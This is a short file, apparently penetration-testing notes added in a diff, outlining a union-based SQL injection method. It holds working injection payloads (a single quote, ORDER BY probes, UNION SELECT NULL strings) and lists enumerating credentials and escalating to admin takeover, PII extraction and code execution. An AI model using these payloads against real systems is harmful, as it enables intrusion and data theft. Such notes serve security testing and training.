@@ -1,0 +1,39 @@
+UNION SQLi METHODOLOGY
+======================
+
+1. Identify injectable parameter
+   Example:
+   /products?category=laptops
+
+2. Trigger SQL error
+   Payload:
+   '
+
+3. Determine column count
+   Payloads:
+   ORDER BY 1--
+   ORDER BY 2--
+   ORDER BY 3--
+
+4. Test UNION compatibility
+   Example:
+   ' UNION SELECT NULL,NULL,NULL--
+
+5. Identify reflected columns
+   Replace NULL with strings:
+   ' UNION SELECT NULL,'TEST',NULL--
+
+6. Enumerate database
+
+   * tables
+   * columns
+   * users
+   * credentials
+
+7. Escalate impact
+
+   * auth bypass
+   * admin takeover
+   * PII extraction
+   * RCE (DB-specific)
+
